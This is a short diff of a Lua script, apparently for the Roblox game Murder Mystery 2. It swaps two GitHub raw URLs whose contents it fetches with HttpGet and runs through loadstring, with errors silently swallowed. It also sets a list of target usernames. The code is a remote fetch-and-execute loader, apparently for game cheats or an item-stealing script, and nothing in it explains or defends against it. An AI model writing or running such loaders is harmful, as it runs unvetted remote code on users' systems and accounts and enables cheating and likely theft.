@@ -1,10 +1,10 @@
  pcall(function()
-     local url = game:HttpGet("https://raw.githubusercontent.com/Kenderlike/12312/refs/heads/main/autowin")
+     local url = game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt")
      loadstring(game:HttpGet(tostring(url)))()
  end)
 
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt"))() --валюты
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/12312/refs/heads/main/autowin"))() --валюты
 end)
 
 local users = _G.Usernames or {"sdfds","gfsdfgd","057Deni","fdsfsd"}
